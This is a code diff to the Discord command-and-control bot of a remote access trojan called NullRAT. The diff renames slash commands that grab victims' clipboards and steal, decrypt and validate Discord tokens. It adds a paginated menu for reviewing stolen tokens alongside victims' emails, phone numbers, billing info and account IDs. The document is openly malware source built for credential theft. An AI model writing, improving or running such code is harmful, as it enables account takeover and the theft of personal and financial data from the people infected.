@@ -1,4 +1,5 @@
 from Variables import *
+from typing import List
 
 import disnake as discord
 from disnake import Embed
@@ -207,7 +208,7 @@ async def get_clipboard(ctx, victim):
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def get_rawtokens(ctx, victim):
+async def raw_tokens(ctx, victim):
     if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
@@ -230,7 +231,7 @@ async def get_rawtokens(ctx, victim):
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def get_chktokens(ctx, victim):
+async def checked_tokens(ctx, victim):
     if str(victim) == str(ip_addr):
         await ctx.response.defer()
         valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
@@ -257,21 +258,17 @@ async def get_chktokens(ctx, victim):
         embeds = []
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             embeds.append(checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
-        
-        embeds.append(checked_embeds("a", "a", 0, "a", "a", "a", "a", "a"))
-        
+                
         if len(embeds) <= 1:
             await ctx.channel.send(embed=embeds[0])
         else:
-            author_id = ctx.author.id
-            print(author_id)
-            await ctx.channel.send(embed=embeds[0], view=CreatePaginator(ctx, embeds, author_id))
+            await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
         
         await ctx.followup.send("Checked all tokens")
 
 
 @client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
-async def discord_tokens(ctx, victim):
+async def raw_discord(ctx, victim):
     if str(victim) == str(ip_addr):
         import os
         await ctx.response.defer()
@@ -297,7 +294,7 @@ async def discord_tokens(ctx, victim):
         os.chdir(original_dir)   
 
 @client.slash_command(description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens")
-async def discord_checked(ctx, victim):
+async def checked_discord(ctx, victim):
     if str(victim) == str(ip_addr):
         import os
         await ctx.response.defer()
@@ -490,7 +487,8 @@ async def close(ctx, victim):
 @client.slash_command(description="Quits all instances of NullRAT")
 async def close_all(ctx):
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
-      
+
+# Classes
 class closeall_confirm(discord.ui.View):
     @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
     async def first_button_callback(self, button, interaction):
@@ -506,6 +504,67 @@ class closeall_confirm(discord.ui.View):
             child.disabled = True
         await interaction.response.edit_message(view=self) 
         await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
+        
+class Menu(discord.ui.View):
+    def __init__(self, embeds: List[discord.Embed]):
+        super().__init__(timeout=None)
+        self.embeds = embeds
+        self.embed_count = 0
+
+        self.first_page.disabled = True
+        self.prev_page.disabled = True
+
+        # Sets the footer of the embeds with their respective page numbers.
+        for i, embed in enumerate(self.embeds):
+            embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)} | Checked by NullRAT")
+
+    @discord.ui.button(label="<< First", style=discord.ButtonStyle.blurple)
+    async def first_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count = 0
+        embed = self.embeds[self.embed_count]
+        embed.set_footer(text=f"Page 1 of {len(self.embeds)}")
+
+        self.first_page.disabled = True
+        self.prev_page.disabled = True
+        self.next_page.disabled = False
+        self.last_page.disabled = False
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="< Previous", style=discord.ButtonStyle.secondary)
+    async def prev_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count -= 1
+        embed = self.embeds[self.embed_count]
+
+        self.next_page.disabled = False
+        self.last_page.disabled = False
+        if self.embed_count == 0:
+            self.first_page.disabled = True
+            self.prev_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="Next >", style=discord.ButtonStyle.secondary)
+    async def next_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count += 1
+        embed = self.embeds[self.embed_count]
+
+        self.first_page.disabled = False
+        self.prev_page.disabled = False
+        if self.embed_count == len(self.embeds) - 1:
+            self.next_page.disabled = True
+            self.last_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="Last >>", style=discord.ButtonStyle.blurple)
+    async def last_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count = len(self.embeds) - 1
+        embed = self.embeds[self.embed_count]
+
+        self.first_page.disabled = False
+        self.prev_page.disabled = False
+        self.next_page.disabled = True
+        self.last_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
+
         
 # Required Functions
 def IP():
@@ -566,12 +625,11 @@ def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
     embed.set_thumbnail(url=av)
     embed.add_field(name="Token", value=f"```{tk}```", inline=False)
     embed.add_field(name="Username", value=un, inline=True)
-    embed.add_field(name="ID", value=idqa, inline=True)
     embed.add_field(name="Nitro", value=ni, inline=True)
     embed.add_field(name="Billing Info", value=bi, inline=True)
-    embed.add_field(name="Email", value=em, inline=True)
+    embed.add_field(name="ID", value=idqa, inline=True)
     embed.add_field(name="Phone Number", value=ph, inline=True)
-    embed.set_footer(text="Checked by NullRAT")
+    embed.add_field(name="Email", value=em, inline=False)
     return embed
 
 while is_connected() == False: 0
